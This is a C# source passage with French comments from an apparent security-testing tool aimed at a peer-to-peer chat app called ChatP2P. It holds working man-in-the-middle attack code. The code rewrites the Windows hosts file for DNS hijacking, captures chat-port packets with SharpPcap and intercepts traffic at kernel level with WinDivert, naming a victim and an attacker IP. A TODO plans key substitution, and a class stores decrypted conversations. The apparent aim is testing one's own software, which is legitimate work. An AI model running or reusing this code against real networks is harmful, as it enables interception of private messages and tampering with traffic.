                return GetLocalIPAddress();
            }
            catch
            {
                return "192.168.1.145"; // Fallback
            }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0);
                socket.Connect("8.8.8.8", 65530);
                var endPoint = socket.LocalEndPoint as IPEndPoint;
                var localIP = endPoint?.Address;

                return localIP?.ToString() ?? "localhost";
            }
            catch
            {
                return "localhost";
            }
        }

        /// <summary>
        /// 📝 HOSTS FILE: Configuration pour redirection DNS
        /// </summary>
        private async Task ConfigureHostsFile(string relayServerIP)
        {
            try
            {
                var hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
                var mitmpEntry = $"127.0.0.1 {relayServerIP}";

                LogMessage?.Invoke($"📝 Configuration fichier hosts: {mitmpEntry}");

                string hostsContent;
                try
                {
                    hostsContent = await File.ReadAllTextAsync(hostsPath);
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"❌ Accès refusé fichier hosts: {ex.Message}");
                    LogMessage?.Invoke($"💡 Alternative: Utilisation commande netsh pour résolution");
                    return;
                }

                // Vérifier si l'entrée existe déjà
                if (hostsContent.Contains(mitmpEntry))
                {
                    LogMessage?.Invoke($"✅ Entrée hosts déjà présente: {mitmpEntry}");
                    return;
                }

                // Ajouter l'entrée MITM
                var updatedContent = hostsContent.TrimEnd() + Environment.NewLine + mitmpEntry + Environment.NewLine;
                await File.WriteAllTextAsync(hostsPath, updatedContent);

                LogMessage?.Invoke($"✅ Hosts file mis à jour: {relayServerIP} → 127.0.0.1");
                LogMessage?.Invoke($"🌐 DNS Hijacking effectif pour {relayServerIP}");

                // Flush DNS cache pour application immédiate
                await ExecuteCommand("ipconfig /flushdns", "Flush DNS cache");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur configuration hosts: {ex.Message}");
                LogMessage?.Invoke($"⚠️ Exécutez SecurityTester en tant qu'Administrateur");
                LogMessage?.Invoke($"💡 Alternative manuelle: Ajoutez '127.0.0.1 {relayServerIP}' dans C:\\Windows\\System32\\drivers\\etc\\hosts");
            }
        }

        /// <summary>
        /// 🧹 CLEANUP: Nettoyage fichier hosts
        /// </summary>
        private async Task CleanupHostsFile(string relayServerIP)
        {
            try
            {
                var hostsPath = @"C:\Windows\System32\drivers\etc\hosts";
                var mitmpEntry = $"127.0.0.1 {relayServerIP}";

                LogMessage?.Invoke($"🧹 Nettoyage fichier hosts: {mitmpEntry}");

                var hostsContent = await File.ReadAllTextAsync(hostsPath);

                // Supprimer l'entrée MITM
                var lines = hostsContent.Split(Environment.NewLine, StringSplitOptions.None);
                var filteredLines = lines.Where(line => !line.Contains(mitmpEntry)).ToArray();
                var cleanedContent = string.Join(Environment.NewLine, filteredLines);

                await File.WriteAllTextAsync(hostsPath, cleanedContent);

                LogMessage?.Invoke($"✅ Hosts file nettoyé");

                // Flush DNS cache pour application immédiate
                await ExecuteCommand("ipconfig /flushdns", "Flush DNS cache");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"⚠️ Erreur nettoyage hosts: {ex.Message}");
                LogMessage?.Invoke($"💡 Nettoyage manuel requis: Supprimez '127.0.0.1 {relayServerIP}' de C:\\Windows\\System32\\drivers\\etc\\hosts");
            }
        }

        /// <summary>
        /// 📊 MONITORING: Surveillance connexions pour validation MITM
        /// </summary>
        private async Task MonitorConnections(string relayServerIP, int[] monitoredPorts)
        {
            try
            {
                _monitoringActive = true;
                var monitorCount = 0;
                LogMessage?.Invoke($"📊 DÉMARRAGE monitoring connexions vers {relayServerIP}");
                LogMessage?.Invoke($"   🎯 Ports surveillés: {string.Join(", ", monitoredPorts)}");

                while (_monitoringActive)
                {
                    monitorCount++;
                    LogMessage?.Invoke($"📊 Monitoring #{monitorCount}: Vérification connexions actives...");

                    // Obtenir connexions TCP actives
                    var connections = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpConnections();
                    var relayConnections = connections.Where(c => c.RemoteEndPoint.Address.ToString() == relayServerIP).ToArray();

                    if (relayConnections.Any())
                    {
                        LogMessage?.Invoke($"📊 {relayConnections.Length} connexion(s) vers {relayServerIP} détectée(s):");

                        foreach (var port in monitoredPorts)
                        {
                            var portConnections = relayConnections.Where(c => c.RemoteEndPoint.Port == port).ToArray();
                            if (portConnections.Any())
                            {
                                foreach (var conn in portConnections)
                                {
                                    var localPort = conn.LocalEndPoint.Port;
                                    var isProxy = localPort == port; // Très basique, améliorer

                                    if (isProxy)
                                    {
                                        LogMessage?.Invoke($"   ✅ Port {port}: Connexion via PROXY (MITM réussi)");
                                    }
                                    else
                                    {
                                        LogMessage?.Invoke($"   ❌ Port {port}: Connexion DIRECTE (MITM bypass!)");
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        LogMessage?.Invoke($"📊 Monitoring #{monitorCount}: Aucune connexion vers {relayServerIP}");
                    }

                    await Task.Delay(6000); // Check toutes les 6 secondes
                }

                LogMessage?.Invoke($"📊 MONITORING ARRÊTÉ - {monitorCount} vérifications effectuées");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur monitoring connexions: {ex.Message}");
            }
        }

        /// <summary>
        /// 🌐 GATEWAY: Détection automatique de la passerelle par défaut
        /// </summary>
        private string GetDefaultGateway()
        {
            try
            {
                var output = "";
                using (var process = new Process())
                {
                    process.StartInfo.FileName = "route";
                    process.StartInfo.Arguments = "print 0.0.0.0";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                }

                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Contains("0.0.0.0") && line.Contains("0.0.0.0"))
                    {
                        var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length >= 3)
                        {
                            return parts[2]; // Gateway IP
                        }
                    }
                }

                return "192.168.1.1"; // Fallback
            }
            catch
            {
                return "192.168.1.1"; // Fallback
            }
        }

        /// <summary>
        /// 📦 PACKET CAPTURE: Démarrage capture niveau driver avec SharpPcap
        /// </summary>
        public async Task StartAdvancedPacketCapture()
        {
            try
            {
                LogMessage?.Invoke("📦 ADVANCED PACKET CAPTURE:");
                LogMessage?.Invoke("   🔍 SharpPcap + WinPcap niveau driver");
                LogMessage?.Invoke("   🎯 Interception packets TCP ChatP2P (ports 7777, 8888, 8889, 8891)");

                var networkCapture = new NetworkCapture();
                networkCapture.LogMessage += LogMessage;
                networkCapture.PacketCaptured += OnAdvancedPacketCaptured;

                // Configuration filtre pour ports ChatP2P uniquement
                var chatP2PPorts = "port 7777 or port 8888 or port 8889 or port 8891";
                var started = await networkCapture.StartCaptureWithFilter(chatP2PPorts);

                if (started)
                {
                    _packetInterceptionActive = true;
                    LogMessage?.Invoke($"✅ PACKET INTERCEPTION ACTIVE - Capture TCP niveau driver");
                    LogMessage?.Invoke($"🔥 MITM COMPLET: ARP + Routes + NAT + Packet Capture");
                }
                else
                {
                    LogMessage?.Invoke($"❌ Échec démarrage packet capture");
                    LogMessage?.Invoke($"💡 Vérifiez: WinPcap/Npcap installé + Admin rights");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur packet capture: {ex.Message}");
            }
        }

        /// <summary>
        /// 📦 CALLBACK: Packet capturé par SharpPcap
        /// </summary>
        private void OnAdvancedPacketCaptured(AttackResult result)
        {
            LogMessage?.Invoke($"📦 PACKET CAPTURÉ: {result.Description}");

            // Analyser le packet pour extraire informations ChatP2P
            if (result.CapturedData != null && result.CapturedData.Length > 0)
            {
                var packetInfo = AnalyzePacketContent(result.CapturedData);
                LogMessage?.Invoke($"   📊 Analyse: {packetInfo}");
            }

            AttackCompleted?.Invoke(result);
        }

        /// <summary>
        /// 🔍 ANALYSE: Contenu packet pour détecter données ChatP2P
        /// </summary>
        private string AnalyzePacketContent(byte[] packetData)
        {
            try
            {
                // Recherche signatures ChatP2P dans le packet
                var packetString = Encoding.UTF8.GetString(packetData, 0, Math.Min(200, packetData.Length));

                if (packetString.Contains("FRIEND_REQUEST"))
                    return "🤝 Friend Request détecté";
                if (packetString.Contains("CHAT_MESSAGE"))
                    return "💬 Message chat détecté";
                if (packetString.Contains("FILE_TRANSFER"))
                    return "📁 Transfert fichier détecté";
                if (packetString.Contains("WebRTC"))
                    return "🌐 Signaling WebRTC détecté";

                return $"📦 Packet TCP générique ({packetData.Length} bytes)";
            }
            catch
            {
                return $"📦 Packet binaire ({packetData.Length} bytes)";
            }
        }

        /// <summary>
        /// 🕷️ Démarre l'interception WinDivert pour manipulation packets niveau kernel
        /// </summary>
        private async Task StartWinDivertInterception(string relayServerIP, string victimIP)
        {
            try
            {
                LogMessage?.Invoke("🕷️ DÉMARRAGE WINDIVERT PACKET INTERCEPTION:");
                LogMessage?.Invoke($"   🎯 Relay Server: {relayServerIP}");
                LogMessage?.Invoke($"   👤 Victime: {victimIP}");
                LogMessage?.Invoke($"   🕷️ Attaquant: {GetAttackerIPAddress()}");

                _winDivertInterceptor = new Network.WinDivertInterceptor_Fixed(relayServerIP, GetAttackerIPAddress(), victimIP);
                _winDivertInterceptor.LogMessage += (msg) => LogMessage?.Invoke($"[WinDivert] {msg}");
                _winDivertInterceptor.PacketIntercepted += (desc, packet) =>
                {
                    LogMessage?.Invoke($"🎯 PACKET INTERCEPTÉ: {desc} ({packet.Length} bytes)");
                    // TODO: Décoder et substituer clés dans packets interceptés
                };

                var started = await _winDivertInterceptor.StartInterception();

                if (started)
                {
                    LogMessage?.Invoke("✅ WINDIVERT MITM ACTIF:");
                    LogMessage?.Invoke($"   📡 Tous packets TCP vers {relayServerIP} interceptés");
                    LogMessage?.Invoke($"   🔄 Redirection automatique vers {GetAttackerIPAddress()}");
                    LogMessage?.Invoke($"   🕷️ Manipulation niveau kernel = MITM COMPLET");
                }
                else
                {
                    LogMessage?.Invoke("❌ WINDIVERT ÉCHEC:");
                    LogMessage?.Invoke("   ⚠️ Privilèges administrateur requis");
                    LogMessage?.Invoke("   ⚠️ WinDivert driver doit être installé");
                    LogMessage?.Invoke("   🔄 Fallback: Utiliser proxies TCP classiques");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur WinDivert: {ex.Message}");
                LogMessage?.Invoke("🔄 Fallback: Proxies TCP sans WinDivert");
            }
        }
    }

    /// <summary>
    /// 🎯 CONVERSATION INTERCEPTÉE: Structure pour stocker résultats décryptage
    /// </summary>
    public class InterceptedConversation
    {
        public string Id { get; set; } = "";
        public string FromPeer { get; set; } = "";
        public string ToPeer { get; set; } = "";
        public string OriginalContent { get; set; } = "";
        public string DecryptedContent { get; set; } = "";
        public DateTime Timestamp { get; set; } = DateTime.Now;
        public bool AttackSuccess { get; set; } = false;
    }
}